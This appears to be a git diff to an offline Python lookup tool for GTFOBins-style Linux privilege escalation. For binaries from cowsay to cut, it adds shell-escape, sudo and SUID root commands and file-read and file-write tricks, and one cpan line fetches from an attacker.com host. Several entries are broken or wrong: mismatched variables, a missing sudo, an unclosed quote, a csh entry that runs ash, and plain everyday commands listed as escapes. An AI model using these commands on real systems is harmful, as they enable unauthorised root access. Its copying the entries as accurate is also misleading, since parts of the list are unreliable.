@@ -927,6 +927,150 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "file-write":
             bins.append("composer init\nphp file-writer.php")
 
+    elif zip_command == "cowsay":
+        if zip_options == "Shell":
+            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\ncowsay -f $TF x")
+        elif zip_options == "sudo":
+            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowsay -f $TF x")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cowsay) .\nTF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowsay -f $TF x")
+        elif zip_options == "file-read":
+            bins.append("cat filename | cowsay")
+        elif zip_options == "file-write":
+            bins.append("cowsay ""Your message here"" > output.txt")
+
+    elif zip_command == "cowthink":
+        if zip_options == "Shell":
+            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\ncowthink -f $TF x")
+        elif zip_options == "sudo":
+            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowthink -f $TF x")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cowthink) .\nTF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowthink -f $TF x")
+        elif zip_options == "file-read":
+            bins.append("cat filename | cowthink")
+        elif zip_options == "file-write":
+            bins.append("cowthink ""Your message here"" > output.txt")
+
+    elif zip_command == "cpan":
+        if zip_options == "sudo":
+            bins.append("sudo cpan\n! exec '/bin/bash'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cpan) .\nsudo cpan\n! exec '/bin/bash'")
+        elif zip_options == "file-read":
+            bins.append("export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();")
+        elif zip_options == "file-write":
+            bins.append("cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();")
+        elif zip_options == "Shell":
+            bins.append("cpan\n! exec '/bin/bash'")
+
+    elif zip_command == "cpio":
+        if zip_options == "sudo":
+            bins.append("echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:")
+        elif zip_options == "Shell":
+            bins.append("echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\necho ""$LFILE"" | cpio -o")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cpio) .\nLFILE=file_to_read\nTF=$(mktemp -d)\necho ""$LFILE"" | ./cpio -R $UID -dp $TF\ncat ""$TF/$LFILE""")
+
+    elif zip_command == "cpulimit":
+        if zip_options == "sudo":
+            bins.append("sudo cpulimit -l 100 -f /bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cpulimit) .\n./cpulimit -l 100 -f -- /bin/sh -p")
+        elif zip_options == "file-read":
+            bins.append("cpulimit -l 50 -e cat input.txt")
+        elif zip_options == "file-write":
+            bins.append("cpulimit -l 50 -e echo ""This is some text"" > output.txt")
+        elif zip_options == "Shell":
+            bins.append("cpulimit -l 100 -f /bin/sh")
+
+    elif zip_command == "crash":
+        if zip_options == "sudo":
+            bins.append("sudo crash -h\n!sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which crash) .\ncrash -h\n!sh")
+        elif zip_options == "Shell":
+            bins.append("crash -h\n!sh")
+        elif zip_options == "file-read":
+            bins.append("crash /path/to/vmcore /path/to/vmlinux")
+        elif zip_options == "file-write":
+            bins.append("crash> kmem -s 0x1000 > kernel_memory_dump.txt")
+
+    elif zip_command == "crontab":
+        if zip_options == "sudo":
+            bins.append("sudo crontab -e")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which crontab) .\ncrontab -e")
+        elif zip_options == "file-read":
+            bins.append("0 5 * * * cat /path/to/your/file.txt >> /path/to/logfile.log")
+        elif zip_options == "file-write":
+            bins.append("0 5 * * * echo ""Hello, World!"" > /path/to/output.txt")
+        elif zip_options == "Shell":
+            bins.append("* * * * * /bin/bash -c 'echo ""Hello from the shell""")
+
+    elif zip_command == "csh":
+        if zip_options == "Shell":
+            bins.append("csh")
+        elif zip_options == "sudo":
+            bins.append("sudo csh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which csh) .\n./csh -b")
+        elif zip_options == "file-write":
+            bins.append("export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'")
+        elif zip_options == "file-read":
+            bins.append("export LFILE=file_to_read\nash -c 'cat DATA > $LFILE'")
+
+    elif zip_command == "csplit":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
+        elif zip_options == "file-write":
+            bins.append("TF=$(mktemp)\necho ""DATA"" > $TF\nLFILE=file_to_write\ncsplit -z -b ""%d$LFILE"" $TF 1")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which csplit) .\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
+        elif zip_options == "Shell":
+            bins.append("csplit input.txt 10 && /bin/bash")
+
+    elif zip_command == "csvtool":
+        if zip_options == "Shell":
+            bins.append("csvtool call '/bin/sh;false' /etc/passwd")
+        elif zip_options == "sudo":
+            bins.append("sudo csvtool call '/bin/sh;false' /etc/passwd")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which csvtool) .\nLFILE=file_to_read\n./csvtool trim t $LFILE")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncsvtool trim t $LFILE")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE")
+
+    elif zip_command == "cupsfilter":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cupsfilter) .\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
+        elif zip_options == "file-read":
+            bins.append("FILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
+        elif zip_options == "file-write":
+            bins.append("FILE=file_to_write\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
+        elif zip_options == "Shell":
+            bins.append("bash -c '[ -f ""$1"" ] && cupsfilter ""$1"" > ""${1%.*}.pdf"" && echo ""Conversion successful: ${1%.*}.pdf"" || echo ""Error: File not found!""' -- inputfile.txt")
+
+    elif zip_command == "cut":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo cut -d """" -f1 ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which cut) .\nLFILE=file_to_read\n./cut -d """" -f1 ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ncut -d """" -f1 ""$LFILE""")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ncut -d """" -f1 ""$LFILE""")
+        elif zip_options == "Shell":
+            bins.append("cut -d ' ' -f 1 /etc/shells | head -n 1 | xargs -I {} sh -c '{}'")
+
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
         if zip_options == "Shell": #This will print out hints for more GTFO bins!
@@ -942,7 +1086,7 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "other":  
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "other":  
         zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
